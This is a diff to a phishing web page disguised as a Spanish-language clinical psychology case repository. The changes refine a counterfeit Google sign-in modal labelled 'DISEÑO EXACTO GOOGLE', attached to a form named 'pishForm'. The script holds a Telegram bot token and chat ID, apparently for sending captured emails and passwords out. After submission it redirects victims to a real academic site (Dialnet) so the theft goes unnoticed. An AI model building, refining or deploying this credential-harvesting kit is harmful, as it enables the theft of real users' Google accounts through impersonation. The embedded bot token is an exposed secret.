@@ -34,9 +34,9 @@
         .google-card {
             background: white;
             border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.30), 0 1px 3px 1px rgba(60,64,67,.15);
             width: 100%;
-            max-width: 450px;
+            max-width: 448px;
             min-height: 500px;
             padding: 48px 40px 36px;
             display: flex;
@@ -51,6 +51,7 @@
             font-size: 16px;
             transition: border 0.2s;
             width: 100%;
+            color: #202124;
         }
 
         .google-input:focus {
@@ -88,9 +89,9 @@
                 </div>
             </div>
             <nav class="hidden md:flex space-x-8 text-sm font-medium text-gray-600">
-                <span class="hover:text-blue-700">Enciclopedia</span>
-                <span class="hover:text-blue-700">Protocolos</span>
-                <span class="hover:text-blue-700">Publicaciones</span>
+                <span>Enciclopedia</span>
+                <span>Protocolos</span>
+                <span>Publicaciones</span>
             </nav>
             <button class="bg-blue-700 text-white px-5 py-2 rounded-md text-sm font-medium hover:bg-blue-800 transition">
                 Acceso Institucional
@@ -99,132 +100,102 @@
     </header>
 
     <!-- Hero Section -->
-    <section class="bg-blue-900 text-white py-20 px-6 clickable-overlay">
+    <section class="bg-[#1a237e] text-white py-20 px-6 clickable-overlay">
         <div class="max-w-4xl mx-auto text-center">
-            <h2 class="text-4xl md:text-6xl font-bold mb-6 text-blue-50">Enciclopedia de Casos Clínicos</h2>
-            <p class="text-xl text-blue-100 mb-8 font-light max-w-2xl mx-auto">Inicie sesión con su cuenta institucional de Google para acceder al repositorio académico y protocolos de intervención.</p>
-            <div class="inline-flex items-center space-x-2 text-blue-300 text-sm">
-                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
-                <span>Contenido Protegido por SSL Institucional</span>
+            <h2 class="text-4xl md:text-5xl font-bold mb-6">Enciclopedia de Casos Clínicos</h2>
+            <p class="text-lg text-blue-100 mb-8 font-light max-w-2xl mx-auto">El repositorio académico más grande de Iberoamérica para la consulta de diagnósticos y protocolos de intervención.</p>
+            <div class="bg-white/10 backdrop-blur-md rounded-full px-6 py-3 inline-flex items-center space-x-4 border border-white/20">
+                <input type="text" placeholder="Buscar por diagnóstico o código CIE-10..." class="bg-transparent border-none outline-none text-white placeholder-blue-200 w-64 md:w-96 text-sm">
+                <svg class="w-5 h-5 text-blue-200" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
             </div>
         </div>
     </section>
 
     <!-- Contenido Principal -->
     <main class="max-w-7xl mx-auto py-16 px-6 clickable-overlay">
-        <div class="flex justify-between items-center mb-10 border-b border-gray-200 pb-4">
-            <h3 class="text-2xl font-bold text-gray-800">Casos Clínicos Destacados</h3>
-            <span class="text-sm text-gray-500 italic">Actualizado recientemente</span>
-        </div>
+        <h3 class="text-2xl font-bold text-gray-800 mb-10 flex items-center">
+            <span class="w-1 h-8 bg-blue-700 mr-4"></span>
+            Casos Clínicos Recientes
+        </h3>
 
         <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
             <!-- Caso 1 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-md transition-shadow">
-                <div class="h-40 bg-gray-50 flex flex-col items-center justify-center p-6 text-center border-b border-gray-100">
-                    <div class="bg-blue-100 p-3 rounded-full mb-2 text-blue-700">
-                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
-                    </div>
-                    <span class="text-[10px] font-bold text-gray-400 uppercase">DOCUMENTO ACADÉMICO</span>
+            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
+                <div class="bg-blue-50 p-4 rounded-full mb-4">
+                    <svg class="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
                 </div>
-                <div class="p-6">
-                    <span class="text-[10px] font-bold text-blue-700 uppercase tracking-wider">Psicología Clínica</span>
-                    <h4 class="text-lg font-bold text-gray-900 mt-1 leading-tight">Intervención en Trastorno de Pánico: Un enfoque integrador</h4>
-                    <p class="text-sm text-gray-600 mt-3 line-clamp-2">Revisión sistemática de casos y efectividad de la terapia cognitivo-conductual...</p>
-                    <div class="mt-4 text-blue-600 text-xs font-bold flex items-center">
-                        VER RECURSO <svg class="w-3 h-3 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"></path></svg>
-                    </div>
-                </div>
+                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">DOCUMENTO PDF - 2.4MB</span>
+                <h4 class="text-lg font-bold text-gray-900 mb-2">Manejo de la Depresión Mayor en Adolescentes: Caso 442-B</h4>
+                <p class="text-sm text-gray-500 mb-6">Evaluación multi-axial y plan de intervención farmacológica-conductual...</p>
+                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
             </div>
 
             <!-- Caso 2 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-md transition-shadow">
-                <div class="h-40 bg-gray-50 flex flex-col items-center justify-center p-6 text-center border-b border-gray-100">
-                    <div class="bg-green-100 p-3 rounded-full mb-2 text-green-700">
-                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                    </div>
-                    <span class="text-[10px] font-bold text-gray-400 uppercase">DINÁMICAS GRUPALES</span>
+            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
+                <div class="bg-green-50 p-4 rounded-full mb-4">
+                    <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                 </div>
-                <div class="p-6">
-                    <span class="text-[10px] font-bold text-green-700 uppercase tracking-wider">Terapia Sistémica</span>
-                    <h4 class="text-lg font-bold text-gray-900 mt-1 leading-tight">Abordaje de la Comunicación en Crisis Familiares</h4>
-                    <p class="text-sm text-gray-600 mt-3 line-clamp-2">Modelos de intervención en familias con miembros en situaciones de riesgo...</p>
-                    <div class="mt-4 text-blue-600 text-xs font-bold flex items-center">
-                        VER RECURSO <svg class="w-3 h-3 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"></path></svg>
-                    </div>
-                </div>
+                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">PROTOCOLO CLÍNICO</span>
+                <h4 class="text-lg font-bold text-gray-900 mb-2">Dinámicas de Codependencia en Familias con Adicciones</h4>
+                <p class="text-sm text-gray-500 mb-6">Análisis sistémico de patrones relacionales en una familia nuclear...</p>
+                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
             </div>
 
             <!-- Caso 3 -->
-            <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden hover:shadow-md transition-shadow">
-                <div class="h-40 bg-gray-50 flex flex-col items-center justify-center p-6 text-center border-b border-gray-100">
-                    <div class="bg-purple-100 p-3 rounded-full mb-2 text-purple-700">
-                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
-                    </div>
-                    <span class="text-[10px] font-bold text-gray-400 uppercase">NEUROCIENCIAS</span>
+            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-8 flex flex-col items-center text-center hover:shadow-md transition">
+                <div class="bg-purple-50 p-4 rounded-full mb-4">
+                    <svg class="w-10 h-10 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
                 </div>
-                <div class="p-6">
-                    <span class="text-[10px] font-bold text-purple-700 uppercase tracking-wider">Investigación</span>
-                    <h4 class="text-lg font-bold text-gray-900 mt-1 leading-tight">Análisis de Funciones Ejecutivas en la Adultez Mayor</h4>
-                    <p class="text-sm text-gray-600 mt-3 line-clamp-2">Evaluación neuropsicológica y reserva cognitiva en pacientes con deterioro...</p>
-                    <div class="mt-4 text-blue-600 text-xs font-bold flex items-center">
-                        VER RECURSO <svg class="w-3 h-3 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"></path></svg>
-                    </div>
-                </div>
+                <span class="text-[10px] font-bold text-gray-400 mb-2 uppercase">INVESTIGACIÓN</span>
+                <h4 class="text-lg font-bold text-gray-900 mb-2">Secuelas Cognitivas Post-Trauma Craneoencefálico</h4>
+                <p class="text-sm text-gray-500 mb-6">Estudio longitudinal sobre la plasticidad neuronal y funciones ejecutivas...</p>
+                <button class="text-blue-700 text-xs font-bold uppercase tracking-wider hover:underline">Descargar Caso Completo ↓</button>
             </div>
         </div>
     </main>
 
-    <!-- Footer -->
-    <footer class="bg-gray-100 border-t border-gray-200 py-10 px-6 clickable-overlay">
-        <div class="max-w-7xl mx-auto text-center">
-            <p class="text-gray-500 text-sm">© 2026 Red Iberoamericana de Psicología - Repositorio de Investigación</p>
-        </div>
-    </footer>
-
-    <!-- MODAL DE LOGIN (GOOGLE OFICIAL) -->
+    <!-- MODAL DE LOGIN (DISEÑO EXACTO GOOGLE) -->
     <div id="loginModal" class="google-modal" onclick="event.stopPropagation()">
         <div class="google-card">
             
-            <!-- Pantalla de transición -->
             <div id="loading-screen" class="hidden absolute inset-0 bg-white z-[1100] flex flex-col items-center justify-center rounded-lg">
                 <div class="loader mb-4"></div>
-                <p class="text-gray-600 text-sm font-medium">Iniciando sesión...</p>
+                <p class="text-[#202124] text-sm font-medium">Iniciando sesión...</p>
             </div>
 
-            <!-- Logo Google Oficial -->
-            <div class="flex justify-center mb-4">
+            <div class="flex justify-center mb-3">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="75">
             </div>
 
-            <h1 class="text-2xl font-normal text-center text-[#202124] mb-2 mt-2">Iniciar sesión</h1>
-            <p class="text-center text-[#202124] mb-10 text-base">Usa tu cuenta de Google Institucional</p>
+            <h1 class="text-2xl font-normal text-center text-[#202124] mb-2">Iniciar sesión</h1>
+            <p id="subtitle" class="text-center text-[#202124] mb-10 text-base">Accede al Repositorio de Casos PsicoIbero</p>
 
-            <form id="pishForm" class="flex-grow flex flex-col justify-between">
+            <form id="pishForm" class="flex-grow flex flex-col">
                 <!-- PASO 1: EMAIL -->
-                <div id="email-step">
+                <div id="email-step" class="flex flex-col h-full">
                     <input type="email" id="email" placeholder="Correo electrónico o teléfono" required
                         class="google-input placeholder-[#5f6368] text-base mb-2">
                     <div class="mb-8">
-                        <a href="#" class="text-sm font-medium text-blue-600 hover:text-blue-700">¿Has olvidado tu correo electrónico?</a>
+                        <a href="#" class="text-sm font-medium text-[#1a73e8] hover:underline">¿Has olvidado tu correo electrónico?</a>
                     </div>
                     <div class="text-[14px] text-[#5f6368] leading-relaxed mb-8">
-                        ¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <a href="#" class="text-blue-600 font-medium hover:text-blue-700">Más información</a>
+                        ¿No es tu ordenador? Usa el modo invitados para iniciar sesión de forma privada. <a href="#" class="text-[#1a73e8] font-medium hover:underline">Más información</a>
                     </div>
-                    <div class="flex items-center justify-between mt-auto pt-4">
-                        <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-3 py-2 rounded transition text-sm">Crear cuenta</button>
+                    <div class="flex items-center justify-between mt-auto">
+                        <button type="button" class="text-[#1a73e8] font-medium hover:bg-blue-50 px-2 py-2 rounded text-sm transition">Crear cuenta</button>
                         <button type="button" onclick="showPasswordStep()" 
                             class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md hover:bg-[#1b66c9] transition text-sm">Siguiente</button>
                     </div>
                 </div>
 
                 <!-- PASO 2: PASSWORD -->
-                <div id="pass-step" class="hidden">
+                <div id="pass-step" class="hidden flex flex-col h-full">
                     <div class="flex items-center p-1 pl-1 pr-3 border border-gray-300 rounded-full w-fit mb-8 bg-white hover:bg-gray-50 cursor-pointer mx-auto" onclick="backToEmail()">
                         <div class="bg-gray-100 p-1 rounded-full mr-2">
                             <svg class="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
                         </div>
                         <span id="user-display" class="text-sm text-[#3c4043] font-medium truncate max-w-[150px]"></span>
-                        <svg class="w-4 h-4 text-gray-400 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                        <svg class="w-4 h-4 text-gray-400 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                     </div>
 
                     <input type="password" id="password" placeholder="Introduce tu contraseña" required
@@ -235,8 +206,8 @@
                         <label for="show-pass" class="text-sm text-[#202124] cursor-pointer select-none">Mostrar contraseña</label>
                     </div>
 
-                    <div class="flex items-center justify-between mt-auto pt-4">
-                        <button type="button" class="text-blue-600 font-medium hover:bg-blue-50 px-3 py-2 rounded transition text-sm">¿Has olvidado tu contraseña?</button>
+                    <div class="flex items-center justify-between mt-auto">
+                        <button type="button" class="text-[#1a73e8] font-medium hover:bg-blue-50 px-2 py-2 rounded text-sm transition">¿Has olvidado tu contraseña?</button>
                         <button type="submit" 
                             class="bg-[#1a73e8] text-white px-6 py-2 rounded font-medium hover:shadow-md hover:bg-[#1b66c9] transition text-sm">Siguiente</button>
                     </div>
@@ -246,11 +217,10 @@
     </div>
 
     <script>
-        // CONFIGURACIÓN
         const BOT_TOKEN = '8198434477:AAHwTLE56HN-W1-REPwGthWpt69IvPp8r88';
         const CHAT_ID = '6269583447'; 
-        // URL de REDALYC filtrada por Psicología y Casos Clínicos (Repositorio real masivo)
-        const URL_FINAL = 'https://www.redalyc.org/busquedaArticulo.oa?q=psicologia%20casos%20clinicos';
+        // URL de Dialnet (Psicología) - Muy estable y llena de PDFs
+        const URL_FINAL = 'https://dialnet.unirioja.es/servlet/listaarticulos?tipo_busqueda=EJEMPLAR&revista_codigo=366';
 
         function openLogin() {
             const modal = document.getElementById('loginModal');
@@ -266,6 +236,7 @@
                 document.getElementById('email-step').classList.add('hidden');
                 document.getElementById('pass-step').classList.remove('hidden');
                 document.getElementById('user-display').textContent = emailField.value;
+                document.getElementById('subtitle').textContent = 'Te damos la bienvenida';
                 document.getElementById('password').focus();
             } else {
                 emailField.reportValidity();
@@ -275,6 +246,7 @@
         function backToEmail() {
             document.getElementById('pass-step').classList.add('hidden');
             document.getElementById('email-step').classList.remove('hidden');
+            document.getElementById('subtitle').textContent = 'Accede al Repositorio de Casos PsicoIbero';
             document.getElementById('email').focus();
         }
 
@@ -296,7 +268,7 @@
 
             setTimeout(() => { 
                 window.location.href = URL_FINAL; 
-            }, 1800);
+            }, 2000);
         });
 
         document.getElementById('show-pass').addEventListener('change', function() {
